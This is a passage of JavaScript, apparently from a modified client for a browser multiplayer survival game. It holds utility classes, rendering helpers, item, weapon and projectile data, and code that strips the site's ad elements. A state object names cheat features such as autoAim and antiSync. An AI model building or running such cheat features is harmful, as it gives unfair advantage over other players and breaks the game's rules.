    let my = {
        reloaded: false,
        waitHit: 0,
        autoAim: false,
        revAim: false,
        ageInsta: true,
        reSync: false,
        bullTick: 0,
        anti0Tick: 0,
        antiSync: false,
        safePrimary: function(tmpObj) {
            return [0, 8].includes(tmpObj.primaryIndex);
        },
        safeSecondary: function(tmpObj) {
            return [10, 11, 14].includes(tmpObj.secondaryIndex);
        },
        lastDir: 0,
        autoPush: false,
        pushData: {}
    }

    // FIND OBJECTS BY ID/SID:
    function findID(tmpObj, tmp) {
        return tmpObj.find((THIS) => THIS.id == tmp);
    }

    function findSID(tmpObj, tmp) {
        return tmpObj.find((THIS) => THIS.sid == tmp);
    }

    function findPlayerByID(id) {
        return findID(players, id);
    }

    function findPlayerBySID(sid) {
        return findSID(players, sid);
    }

    function findAIBySID(sid) {
        return findSID(ais, sid);
    }

    function findObjectBySid(sid) {
        return findSID(gameObjects, sid);
    }

    function findProjectileBySid(sid) {
        return findSID(gameObjects, sid);
    }

    // AD REMOVAL -- guarded. Neither #adCard nor #promoImgHolder is on the
    // current page, so these unguarded .remove() calls threw at module scope
    // and took the client down before it drew anything.
    let gameName = getEl("gameName");
    if (gameName) gameName.innerText = "!!";
    let adCard = getEl("adCard");
    if (adCard) adCard.remove();
    let promoImageHolder = getEl("promoImgHolder");
    if (promoImageHolder) promoImageHolder.remove();

    let chatButton = getEl("chatButton");
    chatButton.remove();
    let gameCanvas = getEl("gameCanvas");
    let mainContext = gameCanvas.getContext("2d");
    let mapDisplay = getEl("mapDisplay");
    let mapContext = mapDisplay.getContext("2d");
    mapDisplay.width = 300;
    mapDisplay.height = 300;
    let storeMenu = getEl("storeMenu");
    let storeHolder = getEl("storeHolder");
    let upgradeHolder = getEl("upgradeHolder");
    let upgradeCounter = getEl("upgradeCounter");
    let chatBox = getEl("chatBox");
    chatBox.autocomplete = "off";
    chatBox.style.textAlign = "center";
    chatBox.style.width = "18em";
    let chatHolder = getEl("chatHolder");
    let actionBar = getEl("actionBar");
    let leaderboardData = getEl("leaderboardData");
    let itemInfoHolder = getEl("itemInfoHolder");
    let menuCardHolder = getEl("menuCardHolder");
    let mainMenu = getEl("mainMenu");
    getEl("mainMenu").style.backgroundImage = "";
    let diedText = getEl("diedText");
    let screenWidth;
    let screenHeight;
    let maxScreenWidth = config.maxScreenWidth;
    let maxScreenHeight = config.maxScreenHeight;
    let pixelDensity = 1;
    let delta;
    let now;
    let lastUpdate = performance.now();
    let camX;
    let camY;
    let tmpDir;
    let mouseX = 0;
    let mouseY = 0;
    let allianceMenu = getEl("allianceMenu");
    let waterMult = 1;
    let waterPlus = 0;

    let outlineColor = "#525252";
    let darkOutlineColor = "#3d3f42";
    let outlineWidth = 5.5;

    let firstSetup = true;
    let keys = {};
    let moveKeys = {
        87: [0, -1],
        38: [0, -1],
        83: [0, 1],
        40: [0, 1],
        65: [-1, 0],
        37: [-1, 0],
        68: [1, 0],
        39: [1, 0],
    };
    let attackState = 0;
    let inGame = false;

    let macro = {};
    let mills = {
        place: 0,
        placeSpawnPads: 0
    };
    let lastDir;

    let lastLeaderboardData = [];

    // ON LOAD:
    let inWindow = true;
    window.onblur = function() {
        inWindow = false;
    };
    window.onfocus = function() {
        inWindow = true;
        if (player && player.alive) {
            // resetMoveDir();
        }
    };
    let ms = {
        avg: 0,
        max: 0,
        min: 0,
        delay: 0
    }
    function pingSocketResponse() {
        let pingTime = window.pingTime;
        const pingDisplay = document.getElementById("pingDisplay")
        pingDisplay.innerText = "Ping: " + pingTime + " ms`";
        if (pingTime > ms.max || isNaN(ms.max)) {
            ms.max = pingTime;
        }
        if (pingTime < ms.min || isNaN(ms.min)) {
            ms.min = pingTime;
        }

        // if (pingTime >= 90) {
        //     doAutoQ = true;
        // } else {
        //     doAutoQ = false;
        // }
    }

    let placeVisible = [];

    /** CLASS CODES */


    class Utils {
        constructor() {

            // MATH UTILS:
            let mathABS = Math.abs,
                mathCOS = Math.cos,
                mathSIN = Math.sin,
                mathPOW = Math.pow,
                mathSQRT = Math.sqrt,
                mathATAN2 = Math.atan2,
                mathPI = Math.PI;

            let _this = this;

            // GLOBAL UTILS:
            this.round = function(n, v) {
                return Math.round(n * v) / v;
            };
            this.toRad = function(angle) {
                return angle * (mathPI / 180);
            };
            this.toAng = function(radian) {
                return radian / (mathPI / 180);
            };
            this.randInt = function(min, max) {
                return Math.floor(Math.random() * (max - min + 1)) + min;
            };
            this.randFloat = function(min, max) {
                return Math.random() * (max - min + 1) + min;
            };
            this.lerp = function(value1, value2, amount) {
                return value1 + (value2 - value1) * amount;
            };
            this.decel = function(val, cel) {
                if (val > 0)
                    val = Math.max(0, val - cel);
                else if (val < 0)
                    val = Math.min(0, val + cel);
                return val;
            };
            this.getDistance = function(x1, y1, x2, y2) {
                return mathSQRT((x2 -= x1) * x2 + (y2 -= y1) * y2);
            };
            this.getDist = function(tmp1, tmp2, type1, type2) {
                let tmpXY1 = {
                    x: type1 == 0 ? tmp1.x : type1 == 1 ? tmp1.x1 : type1 == 2 ? tmp1.x2 : type1 == 3 && tmp1.x3,
                    y: type1 == 0 ? tmp1.y : type1 == 1 ? tmp1.y1 : type1 == 2 ? tmp1.y2 : type1 == 3 && tmp1.y3,
                };
                let tmpXY2 = {
                    x: type2 == 0 ? tmp2.x : type2 == 1 ? tmp2.x1 : type2 == 2 ? tmp2.x2 : type2 == 3 && tmp2.x3,
                    y: type2 == 0 ? tmp2.y : type2 == 1 ? tmp2.y1 : type2 == 2 ? tmp2.y2 : type2 == 3 && tmp2.y3,
                };
                return mathSQRT((tmpXY2.x -= tmpXY1.x) * tmpXY2.x + (tmpXY2.y -= tmpXY1.y) * tmpXY2.y);
            };
            this.getDirection = function(x1, y1, x2, y2) {
                return mathATAN2(y1 - y2, x1 - x2);
            };
            this.getDirect = function(tmp1, tmp2, type1, type2) {
                let tmpXY1 = {
                    x: type1 == 0 ? tmp1.x : type1 == 1 ? tmp1.x1 : type1 == 2 ? tmp1.x2 : type1 == 3 && tmp1.x3,
                    y: type1 == 0 ? tmp1.y : type1 == 1 ? tmp1.y1 : type1 == 2 ? tmp1.y2 : type1 == 3 && tmp1.y3,
                };
                let tmpXY2 = {
                    x: type2 == 0 ? tmp2.x : type2 == 1 ? tmp2.x1 : type2 == 2 ? tmp2.x2 : type2 == 3 && tmp2.x3,
                    y: type2 == 0 ? tmp2.y : type2 == 1 ? tmp2.y1 : type2 == 2 ? tmp2.y2 : type2 == 3 && tmp2.y3,
                };
                return mathATAN2(tmpXY1.y - tmpXY2.y, tmpXY1.x - tmpXY2.x);
            };
            this.getAngleDist = function(a, b) {
                let p = mathABS(b - a) % (mathPI * 2);
                return (p > mathPI ? (mathPI * 2) - p : p);
            };
            this.isNumber = function(n) {
                return (typeof n == "number" && !isNaN(n) && isFinite(n));
            };
            this.isString = function(s) {
                return (s && typeof s == "string");
            };
            this.kFormat = function(num) {
                return num > 999 ? (num / 1000).toFixed(1) + "k" : num;
            };
            this.sFormat = function(num) {
                let fixs = [{
                    num: 1e3,
                    string: "k"
                },
                            {
                                num: 1e6,
                                string: "m"
                            },
                            {
                                num: 1e9,
                                string: "b"
                            },
                            {
                                num: 1e12,
                                string: "q"
                            }
                           ].reverse();
                let sp = fixs.find(v => num >= v.num);
                if (!sp) return num;
                return (num / sp.num).toFixed(1) + sp.string;
            };
            this.capitalizeFirst = function(string) {
                return string.charAt(0).toUpperCase() + string.slice(1);
            };
            this.fixTo = function(n, v) {
                return parseFloat(n.toFixed(v));
            };
            this.sortByPoints = function(a, b) {
                return parseFloat(b.points) - parseFloat(a.points);
            };
            this.lineInRect = function(recX, recY, recX2, recY2, x1, y1, x2, y2) {
                let minX = x1;
                let maxX = x2;
                if (x1 > x2) {
                    minX = x2;
                    maxX = x1;
                }
                if (maxX > recX2)
                    maxX = recX2;
                if (minX < recX)
                    minX = recX;
                if (minX > maxX)
                    return false;
                let minY = y1;
                let maxY = y2;
                let dx = x2 - x1;
                if (Math.abs(dx) > 0.0000001) {
                    let a = (y2 - y1) / dx;
                    let b = y1 - a * x1;
                    minY = a * minX + b;
                    maxY = a * maxX + b;
                }
                if (minY > maxY) {
                    let tmp = maxY;
                    maxY = minY;
                    minY = tmp;
                }
                if (maxY > recY2)
                    maxY = recY2;
                if (minY < recY)
                    minY = recY;
                if (minY > maxY)
                    return false;
                return true;
            };
            this.containsPoint = function(element, x, y) {
                let bounds = element.getBoundingClientRect();
                let left = bounds.left + window.scrollX;
                let top = bounds.top + window.scrollY;
                let width = bounds.width;
                let height = bounds.height;

                let insideHorizontal = x > left && x < left + width;
                let insideVertical = y > top && y < top + height;
                return insideHorizontal && insideVertical;
            };
            this.mousifyTouchEvent = function(event) {
                let touch = event.changedTouches[0];
                event.screenX = touch.screenX;
                event.screenY = touch.screenY;
                event.clientX = touch.clientX;
                event.clientY = touch.clientY;
                event.pageX = touch.pageX;
                event.pageY = touch.pageY;
            };
            this.hookTouchEvents = function(element, skipPrevent) {
                let preventDefault = !skipPrevent;
                let isHovering = false;
                // let passive = window.Modernizr.passiveeventlisteners ? {passive: true} : false;
                let passive = false;
                element.addEventListener("touchstart", this.checkTrusted(touchStart), passive);
                element.addEventListener("touchmove", this.checkTrusted(touchMove), passive);
                element.addEventListener("touchend", this.checkTrusted(touchEnd), passive);
                element.addEventListener("touchcancel", this.checkTrusted(touchEnd), passive);
                element.addEventListener("touchleave", this.checkTrusted(touchEnd), passive);

                function touchStart(e) {
                    _this.mousifyTouchEvent(e);
                    window.setUsingTouch(true);
                    if (preventDefault) {
                        e.preventDefault();
                        e.stopPropagation();
                    }
                    if (element.onmouseover)
                        element.onmouseover(e);
                    isHovering = true;
                }

                function touchMove(e) {
                    _this.mousifyTouchEvent(e);
                    window.setUsingTouch(true);
                    if (preventDefault) {
                        e.preventDefault();
                        e.stopPropagation();
                    }
                    if (_this.containsPoint(element, e.pageX, e.pageY)) {
                        if (!isHovering) {
                            if (element.onmouseover)
                                element.onmouseover(e);
                            isHovering = true;
                        }
                    } else {
                        if (isHovering) {
                            if (element.onmouseout)
                                element.onmouseout(e);
                            isHovering = false;
                        }
                    }
                }

                function touchEnd(e) {
                    _this.mousifyTouchEvent(e);
                    window.setUsingTouch(true);
                    if (preventDefault) {
                        e.preventDefault();
                        e.stopPropagation();
                    }
                    if (isHovering) {
                        if (element.onclick)
                            element.onclick(e);
                        if (element.onmouseout)
                            element.onmouseout(e);
                        isHovering = false;
                    }
                }
            };
            this.removeAllChildren = function(element) {
                while (element.hasChildNodes()) {
                    element.removeChild(element.lastChild);
                }
            };
            this.generateElement = function(config) {
                let element = document.createElement(config.tag || "div");

                function bind(configValue, elementValue) {
                    if (config[configValue])
                        element[elementValue] = config[configValue];
                }
                bind("text", "textContent");
                bind("html", "innerHTML");
                bind("class", "className");
                for (let key in config) {
                    switch (key) {
                        case "tag":
                        case "text":
                        case "html":
                        case "class":
                        case "style":
                        case "hookTouch":
                        case "parent":
                        case "children":
                            continue;
                        default:
                            break;
                    }
                    element[key] = config[key];
                }
                if (element.onclick)
                    element.onclick = this.checkTrusted(element.onclick);
                if (element.onmouseover)
                    element.onmouseover = this.checkTrusted(element.onmouseover);
                if (element.onmouseout)
                    element.onmouseout = this.checkTrusted(element.onmouseout);
                if (config.style) {
                    element.style.cssText = config.style;
                }
                if (config.hookTouch) {
                    this.hookTouchEvents(element);
                }
                if (config.parent) {
                    config.parent.appendChild(element);
                }
                if (config.children) {
                    for (let i = 0; i < config.children.length; i++) {
                        element.appendChild(config.children[i]);
                    }
                }
                return element;
            };
            this.checkTrusted = function(callback) {
                return function(ev) {
                    if (ev && ev instanceof Event && (ev && typeof ev.isTrusted == "boolean" ? ev.isTrusted : true)) {
                        callback(ev);
                    } else {
                        //console.error("Event is not trusted.", ev);
                    }
                };
            };
            this.randomString = function(length) {
                let text = "";
                let possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                for (let i = 0; i < length; i++) {
                    text += possible.charAt(Math.floor(Math.random() * possible.length));
                }
                return text;
            };
            this.countInArray = function(array, val) {
                let count = 0;
                for (let i = 0; i < array.length; i++) {
                    if (array[i] === val) count++;
                }
                return count;
            };
            this.hexToRgb = function(hex) {
                return hex.slice(1).match(/.{1,2}/g).map(g => parseInt(g, 16));
            };
            this.getRgb = function(r, g, b) {
                return [r / 255, g / 255, b / 255].join(", ");
            };
        }
    };
    class Animtext {
        // ANIMATED TEXT:
        constructor() {
            // INIT:
            this.init = function(x, y, scale, speed, life, text, color) {
                (this.x = x),
                    (this.y = y),
                    (this.color = color),
                    (this.scale = scale*3.5),
                    (this.weight = 50);
                (this.startScale = this.scale * 1.2),
                    (this.maxScale = 1.5 * scale),
                    (this.minScale = 0.5 * scale),
                    (this.scaleSpeed = 0.7),
                    (this.speed = speed),
                    (this.speedMax = speed),
                    (this.life = life),
                    (this.maxLife = life),
                    (this.text = text),
                    this.movSpeed = speed;
            };

            // UPDATE:
            this.update = function(delta) {
                if(this.life){
                    this.life -= delta;
                    if(this.scaleSpeed != -0.35){
                        this.y -= this.speed * delta;
                        // (this.x += this.speed * delta);
                    } else {
                        this.y -= this.speed * delta;
                    }
                    this.scale -= .8;
                    // this.scale > 0.35 && (this.scale = Math.max(this.scale, this.startScale));
                    // this.speed < this.speedMax && (this.speed -= this.speedMax * .0075);
                    if(this.scale >= this.maxScale){
                        this.scale = this.maxScale;
                        this.scaleSpeed *= -.5;
                        this.speed = this.speed * .75;
                    };
                    this.life <= 0 && (this.life = 0)
                };
            };

            // RENDER:
            this.render = function(ctxt, xOff, yOff) {
                ctxt.lineWidth = 10;
                ctxt.strokeStyle = darkOutlineColor; //"black";
                ctxt.fillStyle = this.color;
                ctxt.globalAlpha = 1;
                ctxt.font = this.scale + "px HammerSmith One";
                ctxt.strokeText(this.text, this.x - xOff, this.y - yOff);
                ctxt.fillText(this.text, this.x - xOff, this.y - yOff);
                ctxt.globalAlpha = 1;
            };
        }
    };
    class Textmanager {
        // TEXT MANAGER:
        constructor() {
            this.texts = [];
            this.stack = [];

            // UPDATE:
            this.update = function(delta, ctxt, xOff, yOff) {
                ctxt.textBaseline = "middle";
                ctxt.textAlign = "center";
                for (let i = 0; i < this.texts.length; ++i) {
                    if (this.texts[i].life) {
                        this.texts[i].update(delta);
                        this.texts[i].render(ctxt, xOff, yOff);
                    }
                }
            };

            // SHOW TEXT:
            this.showText = function(x, y, scale, speed, life, text, color) {
                let tmpText;
                for (let i = 0; i < this.texts.length; ++i) {
                    if (!this.texts[i].life) {
                        tmpText = this.texts[i];
                        break;
                    }
                }
                if (!tmpText) {
                    tmpText = new Animtext();
                    this.texts.push(tmpText);
                }
                tmpText.init(x, y, scale, speed, life, text, color);
            };
        }
    }

    class GameObject {
        constructor(sid) {
            this.sid = sid;

            // INIT:
            this.init = function(x, y, dir, scale, type, data, owner) {
                data = data || {};
                this.sentTo = {};
                this.gridLocations = [];
                this.active = true;
                this.render = true;
                this.doUpdate = data.doUpdate;
                this.x = x;
                this.y = y;
                this.dir = dir;
                this.lastDir = dir;
                this.xWiggle = 0;
                this.yWiggle = 0;
                this.visScale = scale;
                this.scale = scale;
                this.type = type;
                this.id = data.id;
                this.owner = owner;
                this.name = data.name;
                this.isItem = (this.id != undefined);
                this.group = data.group;
                this.maxHealth = data.health;
                this.health = this.maxHealth;
                this.layer = 2;
                if (this.group != undefined) {
                    this.layer = this.group.layer;
                } else if (this.type == 0) {
                    this.layer = 3;
                } else if (this.type == 2) {
                    this.layer = 0;
                } else if (this.type == 4) {
                    this.layer = -1;
                }
                this.colDiv = data.colDiv || 1;
                this.blocker = data.blocker;
                this.ignoreCollision = data.ignoreCollision;
                this.dontGather = data.dontGather;
                this.hideFromEnemy = data.hideFromEnemy;
                this.friction = data.friction;
                this.projDmg = data.projDmg;
                this.dmg = data.dmg;
                this.pDmg = data.pDmg;
                this.pps = data.pps;
                this.zIndex = data.zIndex || 0;
                this.turnSpeed = data.turnSpeed;
                this.req = data.req;
                this.trap = data.trap;
                this.healCol = data.healCol;
                this.teleport = data.teleport;
                this.boostSpeed = data.boostSpeed;
                this.projectile = data.projectile;
                this.shootRange = data.shootRange;
                this.shootRate = data.shootRate;
                this.shootCount = this.shootRate;
                this.spawnPoint = data.spawnPoint;
                this.onNear = 0;
                this.breakObj = false;
                this.alpha = data.alpha || 1;
                this.maxAlpha = data.alpha || 1;
                this.damaged = 0;
            };

            // GET HIT:
            this.changeHealth = function(amount, doer) {
                this.health += amount;
                return (this.health <= 0);
            };

            // GET SCALE:
            this.getScale = function(sM, ig) {
                sM = sM || 1;
                return this.scale * ((this.isItem || this.type == 2 || this.type == 3 || this.type == 4) ?
                                     1 : (0.6 * sM)) * (ig ? 1 : this.colDiv);
            };

            // VISIBLE TO PLAYER:
            this.visibleToPlayer = function(player) {
                return !(this.hideFromEnemy) || (this.owner && (this.owner == player ||
                                                                (this.owner.team && player.team == this.owner.team)));
            };

            // UPDATE:
            this.update = function(delta) {
                if (this.active) {
                    if (this.xWiggle) {
                        this.xWiggle *= Math.pow(0.99, delta);
                    }
                    if (this.yWiggle) {
                        this.yWiggle *= Math.pow(0.99, delta);
                    }
                    let d2 = UTILS.getAngleDist(this.lastDir, this.dir);
                    if (d2 > 0.01) {
                        this.dir += d2 / 5;
                    } else {
                        this.dir = this.lastDir;
                    }
                } else {
                    if (this.alive) {
                        this.alpha -= delta / (200 / this.maxAlpha);
                        this.visScale += delta / (this.scale / 2.5);
                        if (this.alpha <= 0) {
                            this.alpha = 0;
                            this.alive = false;
                        }
                    }
                }
            };

            // CHECK TEAM:
            this.isTeamObject = function(tmpObj) {
                return this.owner == null ? true : (this.owner && tmpObj.sid == this.owner.sid || tmpObj.findAllianceBySid(this.owner.sid));
            };
        }
    }
    class Items {
        constructor() {
            // ITEM GROUPS:
            this.groups = [{
                id: 0,
                name: "food",
                layer: 0
            }, {
                id: 1,
                name: "walls",
                place: true,
                limit: 30,
                layer: 0
            }, {
                id: 2,
                name: "spikes",
                place: true,
                limit: 15,
                layer: 0
            }, {
                id: 3,
                name: "mill",
                place: true,
                limit: 7,
                layer: 1
            }, {
                id: 4,
                name: "mine",
                place: true,
                limit: 1,
                layer: 0
            }, {
                id: 5,
                name: "trap",
                place: true,
                limit: 6,
                layer: -1
            }, {
                id: 6,
                name: "booster",
                place: true,
                limit: 12,
                layer: -1
            }, {
                id: 7,
                name: "turret",
                place: true,
                limit: 2,
                layer: 1
            }, {
                id: 8,
                name: "watchtower",
                place: true,
                limit: 12,
                layer: 1
            }, {
                id: 9,
                name: "buff",
                place: true,
                limit: 4,
                layer: -1
            }, {
                id: 10,
                name: "spawn",
                place: true,
                limit: 1,
                layer: -1
            }, {
                id: 11,
                name: "sapling",
                place: true,
                limit: 2,
                layer: 0
            }, {
                id: 12,
                name: "blocker",
                place: true,
                limit: 3,
                layer: -1
            }, {
                id: 13,
                name: "teleporter",
                place: true,
                limit: 2,
                layer: -1
            }];

            // PROJECTILES:
            this.projectiles = [{
                indx: 0,
                layer: 0,
                src: "arrow_1",
                dmg: 25,
                speed: 1.6,
                scale: 103,
                range: 1000
            }, {
                indx: 1,
                layer: 1,
                dmg: 25,
                scale: 20
            }, {
                indx: 0,
                layer: 0,
                src: "arrow_1",
                dmg: 35,
                speed: 2.5,
                scale: 103,
                range: 1200
            }, {
                indx: 0,
                layer: 0,
                src: "arrow_1",
                dmg: 30,
                speed: 2,
                scale: 103,
                range: 1200
            }, {
                indx: 1,
                layer: 1,
                dmg: 16,
                scale: 20
            }, {
                indx: 0,
                layer: 0,
                src: "bullet_1",
                dmg: 50,
                speed: 3.6,
                scale: 160,
                range: 1400
            }];

            // WEAPONS:
            this.weapons = [{
                id: 0,
                type: 0,
                name: "tool hammer",
                desc: "tool for gathering all resources",
                src: "hammer_1",
                length: 140,
                width: 140,
                xOff: -3,
                yOff: 18,
                dmg: 25,
                range: 65,
                gather: 1,
                speed: 300
            }, {
                id: 1,
                type: 0,
                age: 2,
                name: "hand axe",
                desc: "gathers resources at a higher rate",
                src: "axe_1",
                length: 140,
                width: 140,
                xOff: 3,
                yOff: 24,
                dmg: 30,
                spdMult: 1,
                range: 70,
                gather: 2,
                speed: 400
            }, {
                id: 2,
                type: 0,
                age: 8,
                pre: 1,
                name: "great axe",
                desc: "deal more damage and gather more resources",
                src: "great_axe_1",
                length: 140,
                width: 140,
                xOff: -8,
                yOff: 25,
                dmg: 35,
                spdMult: 1,
                range: 75,
                gather: 4,
                speed: 400
            }, {
                id: 3,
                type: 0,
                age: 2,
                name: "short sword",
                desc: "increased attack power but slower move speed",
                src: "sword_1",
                iPad: 1.3,
                length: 130,
                width: 210,
                xOff: -8,
                yOff: 46,
                dmg: 35,
                spdMult: 0.85,
                range: 110,
                gather: 1,
                speed: 300
            }, {
                id: 4,
                type: 0,
                age: 8,
                pre: 3,
                name: "katana",
                desc: "greater range and damage",
                src: "samurai_1",
                iPad: 1.3,
                length: 130,
                width: 210,
                xOff: -8,
                yOff: 59,
                dmg: 40,
                spdMult: 0.8,
                range: 118,
                gather: 1,
                speed: 300
            }, {
                id: 5,
                type: 0,
                age: 2,
                name: "polearm",
                desc: "long range melee weapon",
                src: "spear_1",
                iPad: 1.3,
                length: 130,
                width: 210,
                xOff: -8,
                yOff: 53,
                dmg: 45,
                knock: 0.2,
                spdMult: 0.82,
                range: 142,
                gather: 1,
                speed: 700
            }, {
                id: 6,
                type: 0,
                age: 2,
                name: "bat",
                desc: "fast long range melee weapon",
                src: "bat_1",
                iPad: 1.3,
                length: 110,
                width: 180,
                xOff: -8,
                yOff: 53,
                dmg: 20,
                knock: 0.7,
                range: 110,
                gather: 1,
                speed: 300
            }, {
                id: 7,
                type: 0,
                age: 2,
                name: "daggers",
                desc: "really fast short range weapon",
                src: "dagger_1",
                iPad: 0.8,
                length: 110,
                width: 110,
                xOff: 18,
                yOff: 0,
                dmg: 20,
                knock: 0.1,
                range: 65,
                gather: 1,
                hitSlow: 0.1,
                spdMult: 1.13,
                speed: 100
            }, {
                id: 8,
                type: 0,
                age: 2,
                name: "stick",
                desc: "great for gathering but very weak",
                src: "stick_1",
                length: 140,
                width: 140,
                xOff: 3,
                yOff: 24,
                dmg: 1,
                spdMult: 1,
                range: 70,
                gather: 7,
                speed: 400
            }, {
                id: 9,
                type: 1,
                age: 6,
                name: "hunting bow",
                desc: "bow used for ranged combat and hunting",
                src: "bow_1",
                req: ["wood", 4],
                length: 120,
                width: 120,
                xOff: -6,
                yOff: 0,
                Pdmg: 25,
                projectile: 0,
                spdMult: 0.75,
                speed: 600
            }, {
                id: 10,
                type: 1,
                age: 6,
                name: "great hammer",
                desc: "hammer used for destroying structures",
                src: "great_hammer_1",
                length: 140,
                width: 140,
                xOff: -9,
                yOff: 25,
                dmg: 10,
                Pdmg: 10,
                spdMult: 0.88,
                range: 75,
                sDmg: 7.5,
                gather: 1,
                speed: 400
            }, {
                id: 11,
                type: 1,
                age: 6,
                name: "wooden shield",
                desc: "blocks projectiles and reduces melee damage",
                src: "shield_1",
                length: 120,
                width: 120,
                shield: 0.2,
                xOff: 6,
                yOff: 0,
                Pdmg: 0,
                spdMult: 0.7
            }, {
                id: 12,
                type: 1,
                age: 8,
                pre: 9,
                name: "crossbow",
                desc: "deals more damage and has greater range",
                src: "crossbow_1",
                req: ["wood", 5],
                aboveHand: true,
                armS: 0.75,
                length: 120,
                width: 120,
                xOff: -4,
                yOff: 0,
                Pdmg: 35,
                projectile: 2,
                spdMult: 0.7,
                speed: 700
            }, {
                id: 13,
                type: 1,
                age: 9,
                pre: 12,
                name: "repeater crossbow",
                desc: "high firerate crossbow with reduced damage",
                src: "crossbow_2",
                req: ["wood", 10],
                aboveHand: true,
                armS: 0.75,
                length: 120,
                width: 120,
                xOff: -4,
                yOff: 0,
                Pdmg: 30,
                projectile: 3,
                spdMult: 0.7,
                speed: 230
            }, {
                id: 14,
                type: 1,
                age: 6,
                name: "mc grabby",
                desc: "steals resources from enemies",
                src: "grab_1",
                length: 130,
                width: 210,
                xOff: -8,
                yOff: 53,
                dmg: 0,
                Pdmg: 0,
                steal: 250,
                knock: 0.2,
                spdMult: 1.05,
                range: 125,
                gather: 0,
                speed: 700
            }, {
                id: 15,
                type: 1,
                age: 9,
                pre: 12,
                name: "musket",
                desc: "slow firerate but high damage and range",
                src: "musket_1",
                req: ["stone", 10],
                aboveHand: true,
                rec: 0.35,
                armS: 0.6,
                hndS: 0.3,
                hndD: 1.6,
                length: 205,
                width: 205,
                xOff: 25,
                yOff: 0,
                Pdmg: 50,
                projectile: 5,
                hideProjectile: true,
                spdMult: 0.6,
                speed: 1500
            }];

            // ITEMS:
            this.list = [{
                group: this.groups[0],
                name: "apple",
                desc: "restores 20 health when consumed",
                req: ["food", 10],
                consume: function(doer) {
                    return doer.changeHealth(20, doer);
                },
                scale: 22,
                holdOffset: 15,
                healing: 20,
                itemID: 0,
                itemAID: 16,
            }, {
                age: 3,
                group: this.groups[0],
                name: "cookie",
                desc: "restores 40 health when consumed",
                req: ["food", 15],
                consume: function(doer) {
                    return doer.changeHealth(40, doer);
                },
                scale: 27,
                holdOffset: 15,
                healing: 40,
                itemID: 1,
                itemAID: 17,
            }, {
                age: 7,
                group: this.groups[0],
                name: "cheese",
                desc: "restores 30 health and another 50 over 5 seconds",
                req: ["food", 25],
                consume: function(doer) {
                    if (doer.changeHealth(30, doer) || doer.health < 100) {
                        doer.dmgOverTime.dmg = -10;
                        doer.dmgOverTime.doer = doer;
                        doer.dmgOverTime.time = 5;
                        return true;
                    }
                    return false;
                },
                scale: 27,
                holdOffset: 15,
                healing: 30,
                itemID: 2,
                itemAID: 18,
            }, {
                group: this.groups[1],
                name: "wood wall",
                desc: "provides protection for your village",
                req: ["wood", 10],
                projDmg: true,
                health: 380,
                scale: 50,
                holdOffset: 20,
                placeOffset: -5,
                itemID: 3,
                itemAID: 19,
            }, {
                age: 3,
                group: this.groups[1],
                name: "stone wall",
                desc: "provides improved protection for your village",
                req: ["stone", 25],
                health: 900,
                scale: 50,
                holdOffset: 20,
                placeOffset: -5,
                itemID: 4,
                itemAID: 20,
            }, {
                age: 7,
                group: this.groups[1],
                name: "castle wall",
                desc: "provides powerful protection for your village",
                req: ["stone", 35],
                health: 1500,
                scale: 52,
                holdOffset: 20,
                placeOffset: -5,
                itemID: 5,
                itemAID: 21,
            }, {
                group: this.groups[2],
                name: "spikes",
                desc: "damages enemies when they touch them",
                req: ["wood", 20, "stone", 5],
                health: 400,
                dmg: 20,
                scale: 49,
                spritePadding: -23,
                holdOffset: 8,
                placeOffset: -5,
                itemID: 6,
                itemAID: 22,
                shadow: {
                    offsetX: 5, // Adjust the shadow's X offset as needed
                    offsetY: 5, // Adjust the shadow's Y offset as needed
                    blur: 20,  // Adjust the shadow's blur as needed
                    color: "rgba(0, 0, 0, 0.5)" // Adjust the shadow's color and transparency as needed
                }

            }, {
                age: 5,
                group: this.groups[2],
                name: "greater spikes",
                desc: "damages enemies when they touch them",
                req: ["wood", 30, "stone", 10],
                health: 500,
                dmg: 35,
                scale: 52,
                spritePadding: -23,
                holdOffset: 8,
                placeOffset: -5,
                itemID: 7,
                itemAID: 23,
            }, {
                age: 9,
                group: this.groups[2],
                name: "poison spikes",
                desc: "poisons enemies when they touch them",
                req: ["wood", 35, "stone", 15],
                health: 600,
                dmg: 30,
                pDmg: 5,
                scale: 52,
                spritePadding: -23,
                holdOffset: 8,
                placeOffset: -5,
                itemID: 8,
                itemAID: 24,
            }, {
                age: 9,
                group: this.groups[2],
                name: "spinning spikes",
                desc: "damages enemies when they touch them",
                req: ["wood", 30, "stone", 20],
                health: 500,
                dmg: 45,
                turnSpeed: 0.003,
                scale: 52,
                spritePadding: -23,
                holdOffset: 8,
                placeOffset: -5,
                itemID: 9,
                itemAID: 25,
            }, {
                group: this.groups[3],
                name: "windmill",
                desc: "generates gold over time",
                req: ["wood", 50, "stone", 10],
                health: 400,
                pps: 1,
                turnSpeed: 0.0016,
                spritePadding: 25,
                iconLineMult: 12,
                scale: 45,
                holdOffset: 20,
                placeOffset: 5,
                itemID: 10,
                itemAID: 26,
            }, {
                age: 5,
                group: this.groups[3],
                name: "faster windmill",
                desc: "generates more gold over time",
                req: ["wood", 60, "stone", 20],
                health: 500,
                pps: 1.5,
                turnSpeed: 0.0025,
                spritePadding: 25,
                iconLineMult: 12,
                scale: 47,
                holdOffset: 20,
                placeOffset: 5,
                itemID: 11,
                itemAID: 27,
            }, {
                age: 8,
                group: this.groups[3],
                name: "power mill",
                desc: "generates more gold over time",
                req: ["wood", 100, "stone", 50],
                health: 800,
                pps: 2,
                turnSpeed: 0.005,
                spritePadding: 25,
                iconLineMult: 12,
                scale: 47,
                holdOffset: 20,
                placeOffset: 5,
                itemID: 12,
                itemAID: 28,
            }, {
                age: 5,
                group: this.groups[4],
                type: 2,
                name: "mine",
                desc: "allows you to mine stone",
                req: ["wood", 20, "stone", 100],
                iconLineMult: 12,
                scale: 65,
                holdOffset: 20,
                placeOffset: 0,
                itemID: 13,
                itemAID: 29,
            }, {
                age: 5,
                group: this.groups[11],
                type: 0,
                name: "sapling",
                desc: "allows you to farm wood",
                req: ["wood", 150],
                iconLineMult: 12,
                colDiv: 0.5,
                scale: 110,
                holdOffset: 50,
                placeOffset: -15,
                itemID: 14,
                itemAID: 30,
            }, {
                age: 4,
                group: this.groups[5],
                name: "pit trap",
                desc: "pit that traps enemies if they walk over it",
                req: ["wood", 30, "stone", 30],
                trap: true,
                ignoreCollision: true,
                hideFromEnemy: true,
                health: 500,
                colDiv: 0.2,
                scale: 50,
                holdOffset: 20,
                placeOffset: -5,
                alpha: 0.6,
                itemID: 15,
                itemAID: 31,
